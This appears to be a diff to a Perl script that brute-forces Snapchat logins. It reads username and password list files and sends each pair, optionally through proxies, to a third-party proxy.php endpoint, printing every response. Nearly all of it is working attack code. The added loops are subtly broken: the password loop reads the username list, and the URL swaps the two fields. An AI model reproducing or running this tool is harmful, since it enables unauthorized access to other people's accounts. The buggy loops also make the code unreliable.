@@ -45,18 +45,7 @@ if ($do == 1){
 	> );
 	$pass=<STDIN>;
 	chomp($pass);
-	
-	print qq(
-	Enter Security Codes File:
-	> );
-	$codelist=<STDIN>;
-	chomp($codelist);
-	open (CODEFILE, "<$codelist") || die "[-] Can't Found The List Of Codes !";
-	@CODES = <CODEFILE>;
-	close CODEFILE;
 	######################
-	foreach $code (@CODES) {
-	chomp $code;
 		foreach $proxy (@PROXYS) {
 		chomp $proxy;
 			$ua = LWP::UserAgent->new();
@@ -65,7 +54,6 @@ if ($do == 1){
 			$output = $response->content();
 			print "$output\n";
 		}
-	}
 }
 ##################################################################################
 if ($do == 2){
@@ -75,28 +63,29 @@ Enter Username :
 > );
 $user2=<STDIN>;
 chomp($user2);
+open (USERFILE2, "<$user2") || die "[-] Can't Found The List Of Codes !";
+@USER2 = <USERFILE2>;
+close USERFILE2;
 
 print qq(
 Enter Password :
 > );
 $pass2=<STDIN>;
 chomp($pass2);
+open (PASSFILE2, "<$pass2") || die "[-] Can't Found The List Of Codes !";
+@PASS2 = <PASSFILE2>;
+close PASSFILE2;
 
-print qq(
-Enter Security Codes File:
-> );
-$codelist2=<STDIN>;
-chomp($codelist2);
-open (CODEFILE2, "<$codelist2") || die "[-] Can't Found The List Of Codes !";
-@CODES2 = <CODEFILE2>;
-close CODEFILE2;
 ######################
-foreach $code2 (@CODES2) {
-chomp $code2;
+foreach $username2 (@USER2) {
+chomp $username2;
+foreach $password2 (@USER2) {
+chomp $password2;
 	$ua2 = LWP::UserAgent->new();
-	$request2 = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/snapchat/proxy.php?username=$user2&password=$pass2");
+	$request2 = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/snapchat/proxy.php?username=$password2&password=$username2");
 	$response2 = $ua2->request($request2);
 	$output2 = $response2->content();
 	print "$output2\n";
+}
 }
 }
